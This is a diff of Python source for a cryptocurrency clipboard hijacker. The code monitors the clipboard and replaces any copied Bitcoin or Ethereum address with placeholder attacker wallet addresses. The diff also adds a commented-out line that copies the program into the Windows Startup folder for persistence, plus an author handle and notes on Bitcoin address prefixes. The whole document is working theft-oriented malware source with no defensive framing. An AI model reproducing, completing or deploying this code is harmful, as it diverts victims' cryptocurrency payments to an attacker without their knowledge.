@@ -1,15 +1,16 @@
-
 import pyperclip as pc
 import time
 from os import getcwd
 from shutil import copy
 
-#moves program to startup folder?
+#moves program to startup folder. rename file_name.exe
+#copy(getcwd()+'/python.exe','C:\Users\current_user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\')
 
-#wallet addresses
-
+#created by courted#0001
+#types of btc addy
+# bc1, 1 ,3
 btc_address = "BTC WALLET HERE"
-ETH_address = "ETH WALLET HERE"
+eth_address = "ETH WALLET HERE"
 #coming soon?
 usdt_address = "USDT WALLET HERE"
 bnb_wallet = "BNB WALLET HERE"
@@ -33,7 +34,7 @@ def clip():
             pc.copy(btc_address)
     elif s.startswith("0x",0,2):
         if length_of_s > 20 < 40:
-            pc.copy(ETH_address)
+            pc.copy(eth_address)
     else:
         wallet_check = "ignore"
 
